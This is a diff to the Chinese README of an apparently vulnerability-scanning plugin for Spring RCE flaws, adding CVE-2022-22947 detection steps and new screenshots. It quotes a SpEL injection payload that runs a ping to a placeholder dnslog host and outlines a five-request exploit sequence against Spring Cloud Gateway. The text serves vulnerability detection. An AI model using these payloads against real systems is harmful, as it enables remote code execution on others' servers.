@@ -4,7 +4,7 @@
 
 - [x] Spring Core RCE (**CVE-2022-22965**)
 - [x] Spring Cloud Function SpEL RCE (**CVE-2022-22963**)
-- [ ] Spring Cloud GateWay SPEL RCE (**CVE-2022-22947**)
+- [x] Spring Cloud GateWay SPEL RCE (**CVE-2022-22947**)
 
 ## 回连平台
 
@@ -46,6 +46,16 @@
 * 通过执行`ping`命令：`spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping xxx.dnslog.cn")`回连探测
 * 会扫描当前URI、以及当前URI拼接默认路由`/functionRouter`进行漏洞探测。
 
+### CVE-2022-22947 检测方法
+
+* 利用条件
+
+该漏洞为当Spring Cloud Gateway启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。
+
+检测方法：
+
+* 首先随机访问一个不存在的路径，根据特征`Whitelabel Error Page`判断是否是Spring框架；是则打POC，分五个请求：`包含恶意SpEL表达式的路由 -> 刷新路由 -> 访问添加的路由查看RCE结果 -> 删除路由 -> 刷新路由`
+
 ## 编译
 
 如需编译其他JDK版本，可参考如下方法编译jar包：
@@ -66,9 +76,11 @@
 
 漏洞检测情况
 
-![image-20220409121152524](imgs/image-20220409121152524.png)
+![image-20220411234911184](imgs/image-20220411234911184.png)
 
-![image-20220409124509160](imgs/image-20220409124509160.png)
+![image-20220411234930710](imgs/image-20220411234930710.png)
+
+![image-20220411234948718](imgs/image-20220411234948718.png)
 
 插件设置，默认检测方法全开，回连平台默认Dnslog
 
